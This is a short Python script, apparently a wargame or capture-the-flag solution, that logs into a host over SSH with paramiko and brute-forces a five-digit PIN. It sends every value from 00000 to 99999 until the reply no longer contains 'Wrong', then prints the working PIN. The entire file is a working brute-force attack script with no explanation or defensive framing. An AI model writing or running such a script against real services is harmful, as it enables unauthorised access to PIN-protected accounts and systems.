#!/usr/bin/python
import paramiko
import sys
import socket


user='***'
host='***'
pwd='***'
port=22
pincode=00000

try:
    #Conncect via ssh
    cl=paramiko.SSHClient()
    cl.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    cl.connect(hostname=host, username=user, password=pwd, port=port)
    
    #Print welcome message:
    channel = cl.get_transport().open_session()
    channel.exec_command('11111\n')
    print channel.recv(5120)
    
    #Brute PIN code
    while pincode < 100000:
        pin = str(pincode).zfill(5)
        #send pincode 
        channel.sendall(pin+'\n')
        receive_msg =channel.recv(5120)
        print(receive_msg)

        #Check message: 
        if "Wrong" in receive_msg:
            print("Wrong: %s" % pin)
            print(receive_msg)

        else:

        #Print the correct PIN code
            print (receive_msg, pin)
            break
        pincode +=1

finally:
    cl.close()
